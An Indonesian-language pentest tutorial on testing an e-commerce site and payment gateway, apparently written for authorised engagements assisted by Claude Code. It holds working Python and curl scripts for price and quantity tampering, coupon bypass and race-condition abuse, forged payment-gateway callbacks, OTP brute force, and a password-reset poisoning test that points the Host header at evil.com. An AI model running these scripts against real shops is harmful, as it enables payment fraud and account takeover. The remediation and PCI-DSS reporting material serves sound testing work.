# Skenario 12 (Tambahan): Aplikasi E-Commerce + Payment Gateway

**Berlaku untuk:** Aplikasi internet publik dengan transaksi finansial  
**Mengapa perlu tutorial khusus:** Business logic dan payment flow memiliki kerentanan unik  
**Regulasi terkait:** PCI-DSS, UU Perlindungan Konsumen, OJK (Indonesia)

---

## Fokus Utama E-Commerce Pentest

1. **Business logic flaws** — manipulasi harga, diskon, stok
2. **Payment flow vulnerabilities** — bypass payment, price tampering
3. **PII dan data kartu** — penyimpanan data sensitif
4. **Race conditions** — double order, coupon abuse
5. **Account takeover** — karena menyimpan metode bayar tersimpan

---

## Phase 1: E-Commerce Reconnaissance

```bash
# Map seluruh user journey
# 1. Registrasi → 2. Browse → 3. Cart → 4. Checkout → 5. Payment → 6. Order

# Endpoint kritis yang harus ditemukan
curl /api/products                    # list produk + harga
curl /api/cart                        # isi cart
curl /api/cart/add                    # tambah ke cart
curl /api/discount/apply              # kode diskon
curl /api/checkout/calculate          # kalkulasi total
curl /api/checkout/create             # buat order
curl /api/payment/initiate            # inisiasi payment
curl /api/payment/callback            # callback dari gateway
curl /api/orders/{id}                 # detail order
```

**Prompt Claude Code:**
```
E-commerce pentest di targetshop.co.id. Saya punya akun user.
Dari intercept Burp Suite, ini flow checkout yang saya temukan:

1. POST /api/cart/add: {"product_id": 123, "qty": 1}
2. POST /api/checkout/calculate: {"cart_id": "abc", "coupon": ""}
   Response: {"subtotal": 500000, "discount": 0, "total": 500000}
3. POST /api/checkout/create: {"cart_id": "abc", "total": 500000, "payment_method": "transfer"}
4. POST /api/payment/initiate: {"order_id": "ORD-001", "amount": 500000}

Identifikasi semua titik manipulasi potensial di flow ini dan buat test cases.
```

---

## Phase 2: Price Manipulation Testing

```python
# price_manipulation.py

import requests

BASE = "https://targetshop.co.id"
SESSION = {"session": "<cookie>"}

def test_price_tampering_in_checkout():
    """Test apakah total bisa dimanipulasi di checkout"""
    
    # Tambah produk seharga 500.000 ke cart
    cart_resp = requests.post(f"{BASE}/api/cart/add",
                             json={"product_id": 123, "qty": 1},
                             cookies=SESSION)
    cart_id = cart_resp.json()['cart_id']
    
    # Kalkulasi normal
    calc = requests.post(f"{BASE}/api/checkout/calculate",
                        json={"cart_id": cart_id},
                        cookies=SESSION).json()
    print(f"Normal total: {calc['total']}")
    
    # MANIPULASI: kirim total yang diubah
    order_resp = requests.post(f"{BASE}/api/checkout/create",
                              json={
                                  "cart_id": cart_id,
                                  "total": 1,           # Ubah jadi 1 rupiah!
                                  "payment_method": "transfer"
                              },
                              cookies=SESSION)
    
    print(f"Order creation status: {order_resp.status_code}")
    print(f"Response: {order_resp.json()}")
    # Jika order terbuat dengan total 1 → CRITICAL vulnerability!

def test_quantity_manipulation():
    """Test negative quantity untuk mendapat kredit"""
    resp = requests.post(f"{BASE}/api/cart/add",
                        json={"product_id": 123, "qty": -1},  # negatif!
                        cookies=SESSION)
    print(f"Negative qty result: {resp.json()}")
    # Jika cart total jadi negatif → bisa 'earn' money!

test_price_tampering_in_checkout()
test_quantity_manipulation()
```

---

## Phase 3: Discount & Coupon Exploitation

```python
# coupon_attack.py

def test_coupon_stacking():
    """Test apakah bisa pakai lebih dari 1 coupon"""
    coupons = ["SALE50", "MEMBER20", "NEWUSER30"]
    
    for coupon in coupons:
        resp = requests.post(f"{BASE}/api/discount/apply",
                           json={"cart_id": cart_id, "coupon": coupon},
                           cookies=SESSION)
        print(f"Coupon {coupon}: {resp.json()}")
        # Coba semua coupon tanpa remove yang sebelumnya

def test_coupon_bypass():
    """Test bypass coupon validation"""
    payloads = [
        "SALE50",                    # valid coupon
        " SALE50",                   # leading space
        "SALE50 ",                   # trailing space
        "sale50",                    # lowercase
        "SALE50\n",                  # newline
        "SALE50'",                   # SQL injection
        "SALE50%00",                 # null byte
    ]
    for payload in payloads:
        resp = requests.post(f"{BASE}/api/discount/apply",
                           json={"cart_id": cart_id, "coupon": payload},
                           cookies=SESSION)
        if resp.json().get('discount', 0) > 0:
            print(f"[!] Coupon accepted: '{payload}' → {resp.json()['discount']}")

def test_coupon_race_condition():
    """Test apakah coupon 1x bisa dipakai berkali-kali via race condition"""
    import threading
    
    results = []
    def apply_coupon():
        resp = requests.post(f"{BASE}/api/discount/apply",
                           json={"cart_id": cart_id, "coupon": "ONETIME10"},
                           cookies=SESSION)
        results.append(resp.json())
    
    threads = [threading.Thread(target=apply_coupon) for _ in range(10)]
    for t in threads: t.start()
    for t in threads: t.join()
    
    successes = [r for r in results if r.get('discount', 0) > 0]
    print(f"Coupon applied {len(successes)}/10 times (should be max 1)")
```

---

## Phase 4: Payment Flow Testing

### Payment Callback Manipulation

```bash
# Banyak e-commerce menerima callback dari payment gateway
# Test: apakah kita bisa forge callback?

# Normal callback dari Midtrans/Xendit:
# POST /api/payment/callback
# {"order_id": "ORD-001", "status": "pending", "amount": 500000, "signature": "..."}

# MANIPULASI:
curl -X POST https://targetshop.co.id/api/payment/callback \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "ORD-001",
    "status": "settlement",    ← Ubah dari pending ke settlement
    "amount": 500000,
    "signature_key": "any_value"   ← Apakah signature diverifikasi?
  }'
```

**Prompt Claude Code:**
```
E-commerce payment callback testing di targetshop.co.id.
Payment gateway: Midtrans.

Endpoint: POST /api/payment/callback
Normal flow: Midtrans → HTTPS POST → /api/payment/callback → verify signature → update order

Saya ingin test apakah:
1. Server memverifikasi signature dari Midtrans? (cara cek tanpa tahu secret)
2. Bisa forge callback dengan status "settlement" untuk order yang belum dibayar?
3. Apakah order_id di callback dicocokkan dengan session/user yang membuat order?
4. Bisa manipulasi 'amount' di callback → beli 500rb dengan bayar 1rb?

Berikan test methodology dan PoC request untuk setiap scenario.
```

---

## Phase 5: PCI-DSS Compliance Testing

Jika e-commerce menyimpan/memproses data kartu:

```bash
# Cek apakah nomor kartu tersimpan
# (seharusnya TIDAK — PCI-DSS Requirement 3)

# Cari di response API
curl -b cookies.txt https://targetshop.co.id/api/payment-methods | \
  grep -E "[0-9]{13,19}"

# Cek apakah ada di network request
# DevTools → Network → cari "card_number", "cvv", "expiry"

# Test apakah full PAN (Primary Account Number) pernah di-log
curl -b cookies.txt https://targetshop.co.id/api/v1/orders/{id} | \
  python3 -c "import sys,json,re; data=sys.stdin.read(); \
  cards = re.findall(r'[0-9]{13,19}', data); print('PAN found:', cards)"
```

**Prompt Claude Code:**
```
E-commerce pentest dari perspektif PCI-DSS.
Response dari /api/payment-methods:
{
  "methods": [{
    "type": "credit_card",
    "number": "4111111111111111",  ← Full PAN stored!
    "expiry": "12/26",
    "cvv": "123",                  ← CVV stored! (PCI-DSS violation!)
    "holder": "John Doe"
  }]
}

Analisis dari perspektif:
1. PCI-DSS requirement mana yang dilanggar?
2. Risiko bisnis: apa yang terjadi jika database di-breach?
3. Regulasi Indonesia yang relevan (OJK, Bank Indonesia)
4. Cara yang benar menyimpan data kartu (tokenisasi)
5. Rekomendasi remediation yang compliant PCI-DSS
```

---

## Phase 6: Account Takeover (Konteks E-Commerce)

E-commerce sangat menarik untuk ATO karena ada:
- Metode bayar tersimpan
- Poin/reward
- Alamat pengiriman
- Order history

```python
# ato_tests.py

def test_password_reset_poisoning():
    """Host header injection di password reset email"""
    resp = requests.post(f"{BASE}/api/auth/forgot-password",
                        headers={"Host": "evil.com"},
                        json={"email": "victim@gmail.com"})
    # Cek apakah link reset dikirim dengan domain evil.com

def test_otp_brute_force():
    """Test apakah OTP bisa dibrute force"""
    for otp in range(1000, 9999):
        resp = requests.post(f"{BASE}/api/auth/verify-otp",
                           json={"email": "test@test.com", "otp": str(otp)},
                           cookies=SESSION)
        if resp.json().get('success'):
            print(f"[!] OTP valid: {otp}")
            break
        if resp.status_code == 429:
            print(f"Rate limited setelah {otp-1000} attempts")
            break

def test_remember_me_token():
    """Test apakah remember-me token bisa diprediksi"""
    # Dapatkan 5 token berturut-turut untuk analisis pola
    tokens = []
    for _ in range(5):
        resp = requests.post(f"{BASE}/api/auth/login",
                           json={"email": "test@test.com",
                                "password": "test123",
                                "remember_me": True})
        tokens.append(resp.json().get('remember_token'))
    print(f"Tokens untuk dianalisis: {tokens}")
```

---

## Checklist E-Commerce Pentest

```
[ ] Map seluruh user journey (browse → checkout → payment)
[ ] Price manipulation: kirim total berbeda saat checkout
[ ] Quantity manipulation: nilai negatif, nol, sangat besar
[ ] Coupon stacking dan race condition
[ ] Payment callback forgery
[ ] Signature verification check di payment callback
[ ] PAN/CVV storage audit (PCI-DSS)
[ ] IDOR pada orders, invoices, alamat pengiriman
[ ] Account takeover: password reset, OTP brute force
[ ] Voucher/poin manipulation
[ ] Stock manipulation: beli melebihi stok
[ ] Shipping address IDOR (kirim ke alamat user lain)
[ ] Laporan dengan referensi PCI-DSS dan regulasi Indonesia
```

---

## Template Laporan untuk Klien E-Commerce

**Prompt Claude Code:**
```
Executive summary untuk CEO/CTO e-commerce targetshop.co.id:

Temuan kritis:
1. Price tampering: produk 500.000 bisa dibeli seharga 1 rupiah
2. Full PAN dan CVV tersimpan di database → PCI-DSS violation
3. Payment callback tanpa verifikasi signature → bayar tanpa bayar

Fokus pada:
1. Estimasi kerugian finansial potensial
2. Risiko hukum: PCI-DSS, UU Perlindungan Konsumen Indonesia
3. Risiko reputasi (berita viral jika di-exploit)
4. Langkah darurat 48 jam pertama
5. Roadmap perbaikan 30/60/90 hari
```
